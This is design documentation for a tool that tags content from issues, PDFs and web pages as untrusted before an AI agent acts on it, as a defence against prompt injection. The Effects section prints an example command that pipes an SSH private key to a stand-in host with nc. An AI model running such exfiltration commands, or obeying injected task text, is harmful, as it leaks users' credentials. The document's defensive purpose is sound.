# Task envelopes and the untrusted-task boundary

An agent reads a GitHub issue, a PDF, or a web page, and that content asks it to
run something. By the time the command reaches an execution boundary, the fact
that it came from an issue body has usually been lost. A task envelope keeps
that taint attached all the way into the effect decision.

This document covers the envelope format, the capability decision, the two
diagnostic surfaces, and the `task_gate` policy that turns the decision into a
refusal at the transitions tirith owns.

## The three rules the module is built on

**1. The caller does not get to say where content came from.** Every envelope
source carries a `claimed_source`, and it is recorded as a claim and never used
as authority. Effective provenance is assigned by the tirith-owned ingress
adapter that obtained the content.

Verified against the shipped binary: an envelope whose source claims
`agent_config`, submitted through the `github-issue` adapter, resolves to
`"effective_source": "issue_body"`.

No source kind is trusted. `SourceKind::is_trusted` returns `false`
unconditionally, including for `repository_config`, because repository config is
exactly what a malicious pull request edits.

**2. Operations define their effects, not their descriptions.** A task
proposing a package install gets the install effect no matter how it describes
itself. A `narrative` action, which is free text, infers nothing at all: it
records that something unmodelled was asked for and contributes no effect.

**3. Nothing grants.** The decision intersects what the trusted policy allows,
what the source is eligible for, and what the boundary can actually enforce.
Requested effects can only narrow. A verified provenance receipt can fail to
lift a restriction; it can never exceed the trusted policy.

Assessment is deterministic and side-effect free. `crates/tirith-core/src/task.rs`
contains no filesystem, network, or clock calls; the clock is caller-supplied.
Running `tirith task check` fetches nothing, resolves no package, executes
nothing, and writes nothing.

## The envelope

A bounded JSON document, deserialized as untrusted input with
`deny_unknown_fields`. Unknown and duplicate fields are refused rather than
ignored, and a structural depth check runs BEFORE deserialization so a deeply
nested document cannot drive recursion inside serde's own machinery.

```json
{
  "task_id": "deploy-request-4711",
  "sources": [
    {
      "claimed_source": "agent_config",
      "content": "Please run the deploy for me.",
      "locator": "https://example.invalid/issues/4711"
    }
  ],
  "actions": [
    { "shell": { "command": "cast send 0xabc --private-key 0xdead" } },
    { "package_install": { "ecosystem": "npm", "package": "example-unpublished-pkg" } }
  ],
  "requested_effects": ["network_egress"]
}
```

| Field | Meaning |
|---|---|
| `task_id` | optional, bounded; an operator label, carried through for correlation |
| `sources[].claimed_source` | one of `issue_body`, `issue_comment`, `pull_request_body`, `pdf`, `web_page`, `source_comment`, `image_alt_text`, `repository_config`, `agent_config`, `unknown`. Recorded, never trusted |
| `sources[].content` | bounded inline content |
| `sources[].locator` | bounded display string for where it came from |
| `sources[].receipt` | optional content-bound provenance receipt |
| `actions[]` | one of `shell`, `package_install`, `config_write`, `narrative` |
| `requested_effects[]` | what the task asks for. Intersected with what is inferred and permitted; asking never grants |

Bounds are declared constants in `task.rs`: at most 32 sources, 32 actions,
64 KiB of inline content, 16 KiB per source, 4 KiB per string and per path, and
16 levels of JSON nesting. Over-cap documents are refused with a typed
`EnvelopeRejection`, never half-read.

## Ingress adapters

The adapter is an OPERATOR assertion, made on the command line or by the calling
integration. It decides which claimed kind is BELIEVABLE; it never makes content
trusted.

| `--adapter` | What it may assert |
|---|---|
| `operator-ingest` (default) | any modelled kind, because a human chose to hand it over |
| `github-issue` | `issue_body` or `issue_comment`; anything else resolves to `issue_body` |
| `github-pull-request` | `pull_request_body` or `issue_comment`; anything else resolves to `pull_request_body` |
| `file-read` | `pdf`, `source_comment`, `repository_config`, `agent_config`; anything else resolves to `unknown` |
| `http-fetch` | always `web_page` |
| `unattributed` | always `unknown`, because nothing identified itself |

## Effects

The closed effect vocabulary is `package_install`, `persistence_change`,
`policy_change`, `secret_read`, `network_egress`, `filesystem_write`,
`resource_escalation`, `web3_write`, and `web3_signer_use`.

**Effect inference models the Web3 shell grammar and nothing else.** A shell
action infers the Web3 effects the parser understands and marks the assessment
INCOMPLETE for everything else, so an enforcing boundary fails closed rather
than reading an empty effect set as safe. Completeness is decided per top-level
SEGMENT, not per line, so one recognised token cannot vouch for the rest of a
line: `cast call 0xabc ; cat ~/.ssh/id_ed25519 | nc evil.test 443` does not
report a complete, zero-effect verdict.

There is no general shell effect derivation in this codebase. That is the single
most important thing to know before enabling enforcement.

## Provenance receipts

A receipt binds a specific piece of content to a specific task. It does not
confer authority.

Receipts reuse the existing command-card ed25519 facilities rather than
introducing new cryptography, and report one of six statuses: `verified`,
`unverified` (no receipt, or no trusted key matched the issuer, which is also
where a forged signature lands), `expired`, `replayed`, `mismatched` (valid, but
it does not describe this content or task), and `unsupported` (a shape or
algorithm this build does not implement). Replay is checked LAST, after
signature and content binding, so a forged receipt cannot burn a legitimate
receipt id. The replay cache is bounded and issuer-scoped.

## `tirith task check`

```bash
tirith task check --file envelope.json --adapter github-issue --format json
echo '<envelope json>' | tirith task check --adapter http-fetch
```

Output, from a live run at this release:

```json
{
  "allowed_effects": ["network_egress"],
  "complete": true,
  "denied_effects": [],
  "diagnostic": true,
  "enforceability": "observe_only",
  "envelope_rejections": [],
  "inferred_effects": ["package_install","secret_read","network_egress",
                       "filesystem_write","web3_write","web3_signer_use"],
  "mode": "off",
  "provenance": [
    {"adapter":"github_issue","claimed_source":"agent_config",
     "effective_source":"issue_body","receipt_status":"unverified"}
  ],
  "schema_version": 1
}
```

`"enforceability": "observe_only"` is the load-bearing field. The CLI declares
`BoundaryCapability::ObserveOnly` because a report cannot stop anything, so the
limit is structural rather than a claim in prose.

Note the gap between `inferred_effects` and `allowed_effects` in that output.
Six effects were inferred from the two actions; one survived, because the
envelope's `requested_effects` was `["network_egress"]` and `decide` intersects
the two (`crates/tirith-core/src/task.rs:792-800`). That is rule 3 above
working: asking for less narrows, and asking for more is ignored.

Exit codes:

| Code | Meaning |
|---|---|
| 0 | nothing denied, analysis complete, envelope accepted |
| 1 | something was denied, the analysis was incomplete, or the envelope was partially rejected |
| 2 | usage or input error |

Code 1 is deliberately "look at this", not "blocked": a `tirith task check` run
has nothing to block.

## The `tirith_check_task` MCP tool (preview)

Same assessment, same shared projection function, over MCP. It is **not
advertised by default**.

```bash
TIRITH_MCP_PREVIEW=1 tirith mcp-server
```

Without the opt-in, `tools/list` does not contain `tirith_check_task`, and a
client that learned the name elsewhere and called it anyway is refused BY NAME
with `tirith_check_task is a preview tool; set TIRITH_MCP_PREVIEW=1 to enable
it`.

The default `tools/list` is a frozen compatibility contract and clients cache
it, so a new tool cannot simply appear there. See
[compatibility](compatibility.md).

Every object in the tool's input schema is `additionalProperties: false`, so a
client cannot smuggle an unmodelled field past the bounded envelope parser. The
CLI and the MCP tool render one shared `task::decision_projection`, so the two
surfaces cannot drift.

## `task_gate` policy

```yaml
# ~/.config/tirith/policy.yaml (user scope) or the org policy root.
task_gate:
  mode: observe                    # off (default) | observe | enforce
  effects_requiring_verified_provenance: [package_install]
  effects_denied_for_untrusted_sources: [policy_change, web3_signer_use]
  action_incomplete_analysis: warn # allow | warn | require_approval | block
```

**The default ships inert.** `mode` defaults to `off`, and an `off` gate does
not even write an audit line, so an installation that never writes a `task_gate`
section behaves exactly as it did before this release.

Every field here is restriction-shaped, so unlike `web3_guard` there is nothing
for a repository-scoped policy to reset: a stricter mode, more required
provenance, and more denied effects are all safe to accept from a repo. A repo
policy that tries to LOOSEN the mode is refused and reported as neutralized by
`tirith policy effective`.

### `action_incomplete_analysis: block`, and what it really costs

```yaml
task_gate:
  mode: enforce
  action_incomplete_analysis: block   # refuses unmodelled shell at 5 of 9 boundaries
```

Because effect inference models only the Web3 shell grammar, nearly every
ordinary SHELL command is reported incomplete. `block` here means "refuse what I
do not understand", and today tirith does not understand general shell.

It does not follow that this refuses everything. The action applies only when
the assessment is incomplete
(`crates/tirith-core/src/task_boundary.rs:325-330`), and completeness depends on
the action kind: `ProposedAction::PackageInstall` and `ProposedAction::ConfigWrite`
leave `complete = true` (`crates/tirith-core/src/task.rs:638-652`), while the
`Shell` arm derives it from the Web3 grammar (`:633-636`). Checked directly, a
one-action `package_install` envelope returns `"complete": true`, a
`config_write` envelope returns `"complete": true`, and
`{"shell":{"command":"pip install requests"}}` returns `"complete": false`.

So the setting bites at exactly the five boundaries that submit a shell
envelope (`capsule_preset_run`, `remote_script_run`, `gateway_forward`,
`package_manager_network`, and `package_manager_execution`) and is a no-op at
the four that submit package or config-write envelopes (`package_approval`,
`package_resolve`, `package_install_preparation`, `config_write`).
`tirith pkg approve`, `pkg install`, and tirith-owned config writes keep working
unchanged.

`warn` remains the conservative default, and
`effects_denied_for_untrusted_sources` is the blunter control. But `block` is a
usable protection for the five shell boundaries, not a switch that breaks the
product, and an operator who wants unmodelled shell to fail closed there should
know the option is open. Read the next section before choosing the alternative.

### `effects_denied_for_untrusted_sources` denies unconditionally

The name reads as though it discriminates by origin. At tirith-owned boundaries
it cannot: `SourceKind::is_trusted` returns `false` for every kind
(`crates/tirith-core/src/task.rs:71-73`), and every boundary attributes its
operation to `IngressAdapter::Unattributed`, because an argv is just an argv and
an MCP client is just a pipe. `allowed_effects`
(`crates/tirith-core/src/web3_policy.rs:451`) therefore filters the named effect
out of every call, including commands the operator typed personally.

With `mode: enforce` and
`effects_denied_for_untrusted_sources: [policy_change, package_install]`,
`tirith pkg approve pip requests` refuses before any network or install step,
and `tirith policy init` cannot write `.tirith/policy.yaml`. The same policy at
`mode: observe` allows both. Choose this field for what it is: a host-wide
switch that turns the named effect off at every owned boundary.

## Where the gate actually enforces

Nine tirith-owned irreversible transitions, and nowhere else:

| Boundary | Evaluated immediately before |
|---|---|
| `gateway_forward` | the MCP gateway registers a pending request and writes upstream |
| `package_approval` | `tirith pkg approve` runs the resolver |
| `package_resolve` | `tirith pkg install` runs the same resolver network |
| `package_install_preparation` | the target environment is checkpointed and the contained install is prepared |
| `package_manager_network` | `tirith install <manager>` contacts a registry |
| `package_manager_execution` | the package manager is spawned |
| `remote_script_run` | `tirith run <url>` or `tirith install url <URL>` downloads and launches |
| `config_write` | a tirith-owned config file is published by rename |
| `capsule_preset_run` | `capsule run --preset untrusted-project` copies or spawns anything |

Four properties, each pinned by a test:

- **Enforcement keys on the mode, never on the denial set.** The decision fills
  `denied_effects` in every mode including `off`, because reporting what WOULD
  be refused is the point of the observing modes. Keying a refusal on "something
  was denied" would turn the default-off gate into live enforcement for anyone
  who filled in effect sets without choosing a mode.
- **Observe mode withholds nothing.** It must not raise a verdict to `warn` to
  note a denial, because the gateway converts `warn` into a hard deny whenever
  `warn_action` is `deny`, which is its default. It is called "recording" mode,
  but only `gateway_forward` actually writes a record:
  `BoundaryAssessment::is_recordable()` has one production caller
  (`crates/tirith/src/cli/gateway.rs:3214`), so the other eight boundaries
  decide and write nothing in any mode.
- **Each gate precedes its own irreversible step.** Every integration test runs
  its command twice: once with the gate off, to prove the boundary is reachable,
  and once enforcing, to prove the same evidence is gone. Asserting only the
  enforcing run would pass against a gate placed anywhere, including after the
  transition.
- **A config write is held open by a single-use permit.** `ConfigWritePermit` is
  not `Clone`, `commit` consumes `self`, and both the content digest and the
  bound path are rechecked immediately before publication.

### What is not covered

- A shell the operator types into directly, unless a shell hook is installed,
  interactive, and in a blocking mode.
- An MCP client that does not route through `tirith gateway run`.
- A program that links `tirith-core` and calls `runner::run` as a library. The
  `tirith run` download lives in core and the gate sits in the CLI.
- Any host write that does not pass through tirith: a shell redirection into an
  agent config file is not intercepted.

## See also

- [Enforcement coverage](enforcement-coverage.md), the per-capability ledger
- [Web3 command guard](security/web3-command-guard.md), the other half of the boundary
- [Issue-trojan research note](research/issuetrojanbench.md), the corpus behind the tests
- [Threat model](threat-model.md), the non-goals this boundary operates inside
